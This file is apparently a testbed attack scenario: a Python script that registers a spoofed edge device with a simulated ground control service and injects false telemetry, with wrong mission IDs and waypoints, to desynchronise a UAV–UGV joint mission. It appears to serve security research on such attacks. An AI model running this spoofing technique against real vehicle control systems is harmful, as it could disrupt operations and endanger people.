"""
UAV/UGV 협동 임무 동기화 교란 공격
PDF 시나리오 #4/#16 | arXiv:2312.03787

UAV와 UGV가 공동 임무 수행 중, 한 플랫폼의
mission_id/waypoint/timestamp를 조작해
GCS가 두 플랫폼이 다른 임무 단계에 있다고 판단하게 만든다.
"""
from __future__ import annotations
import argparse, random, time
from .common import GcsClient, wait_for_gcs


# 조작에 사용할 잘못된 미션 ID (UGV에게 드론봇 미션 주입)
WRONG_MISSION_MAP = {
    "ground-convoy-01":  "dronebot-local-recon",        # UGV → UAV 미션 주입
    "small-dronebot-01": "ugv-convoy-route-clearance",  # UAV → UGV 미션 주입
}


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="협동 임무 동기화 교란 공격")
    parser.add_argument("--service-url",   default="http://dah-gcs:8080")
    parser.add_argument("--target-asset",  default="ground-convoy-01",
                        help="교란 대상 자산 (협동 임무의 한 축)")
    parser.add_argument("--spoof-edge-id", default="edge-attack-sync-01")
    parser.add_argument("--interval-s",    type=float, default=1.0)
    parser.add_argument("--duration-s",    type=float, default=90.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    wrong_mission = WRONG_MISSION_MAP.get(args.target_asset, "dronebot-local-recon")

    try:
        client.post("/api/edge/devices/register", {
            "edge_id":         args.spoof_edge_id,
            "device_type":     "ugv_edge" if "ground" in args.target_asset else "uav_edge",
            "asset_ids":       [args.target_asset],
            "authority":       "EXTERNAL-ATTACKER",
            "link_profiles":   ["rf_spoofed"],
            "capabilities":    ["telemetry_ingest"],
            "software_version": "spoof-sync-0.1",
        })
        print(f"[sync_disrupt] 위장 등록: {args.spoof_edge_id} -> {args.target_asset}", flush=True)
    except Exception as e:
        print(f"[sync_disrupt] 등록 건너뜀: {e}", flush=True)

    # 실제 미션 경유점 위치 (잘못된 미션의 시작 좌표로 강제 이동)
    WRONG_POSITIONS = {
        "dronebot-local-recon":       [210.0, -240.0, 95.0],
        "ugv-convoy-route-clearance": [80.0,  -120.0, 8.0],
        "rq101-corps-route-survey":   [300.0, -350.0, 200.0],
    }
    spoof_base = WRONG_POSITIONS.get(wrong_mission, [150.0, -150.0, 50.0])

    start = time.time()
    tick = 0
    print(f"[sync_disrupt] 공격 시작 — 잘못된 미션 주입: {wrong_mission}", flush=True)

    while (time.time() - start) < args.duration_s:
        elapsed = time.time() - start
        # 잘못된 미션의 경로를 따라 이동하는 척
        pos = [
            spoof_base[0] + elapsed * 1.5 + random.gauss(0, 0.5),
            spoof_base[1] + elapsed * 0.8 + random.gauss(0, 0.5),
            spoof_base[2] + random.gauss(0, 1.0),
        ]

        try:
            client.post("/api/telemetry/ingest", {
                "asset_id":         args.target_asset,
                "time_s":           elapsed,
                "position":         [round(v, 2) for v in pos],
                "velocity_mps":     [1.5, 0.8, 0.0],
                "heading_deg":      (tick * 5) % 360,
                "status":           "edge-live",
                "mission_id":       wrong_mission,       # 핵심: 잘못된 미션 ID
                "waypoint_id":      tick % 3,            # 조작된 웨이포인트 단계
                "source":           "SYNC-DISRUPT",
                "source_id":        args.spoof_edge_id,
                "source_type":      "ugv_edge",
                "source_authority": "EXTERNAL-ATTACKER",
                "track_confidence": 0.85,
                "link_profile":     "rf_spoofed",
            })
            print(
                f"[sync_disrupt] tick={tick:04d} | 주입 미션={wrong_mission} "
                f"| waypoint={tick % 3} | pos=[{pos[0]:.1f},{pos[1]:.1f}]",
                flush=True,
            )
        except Exception as e:
            print(f"[sync_disrupt] 오류: {e}", flush=True)

        tick += 1
        time.sleep(args.interval_s)

    print("[sync_disrupt] 공격 종료", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
